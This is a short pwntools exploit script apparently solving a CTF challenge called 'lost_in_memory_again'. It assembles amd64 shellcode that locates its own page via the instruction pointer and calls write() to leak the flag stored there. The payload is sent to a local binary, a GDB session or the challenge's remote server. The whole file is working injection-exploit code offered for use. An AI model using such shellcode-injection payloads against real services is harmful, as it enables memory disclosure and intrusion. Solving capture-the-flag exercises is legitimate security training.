from pwn import *

# We don't know where the flag is in memory, but the rip does! It's exactly at the start of the same page where the exploit is stored!!

COMMANDS = """
brva 0x9C2A
c
"""
context.arch = "amd64"

shellcode = '''
    /* loading the address of mmaped flag to rsi */
    lea rsi, [rip]
    and rsi, 0xfffffffffffff000     /* putting the last three nibbles to 0 to get to the start of the page (where the flag has been stored) */

    /* call write(1, rsi, 60) */
    mov     rax, 1           /* syscall: sys_write */
    mov     rdi, 1           /* fd = stdout */
    mov     rdx, 60          /* nbytes = 60, just to be safe ;) */
    syscall
'''

hack = asm(shellcode)
exe = './lost_in_memory_again'

if args.REMOTE:
    c = remote('lost-in-memory-again.ctf.offensivedefensive.it', 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(exe, gdbscript = COMMANDS)
    else:
        c = process(exe)

c.recvuntil(b' > ')
c.send(hack)
print(c.recv(60))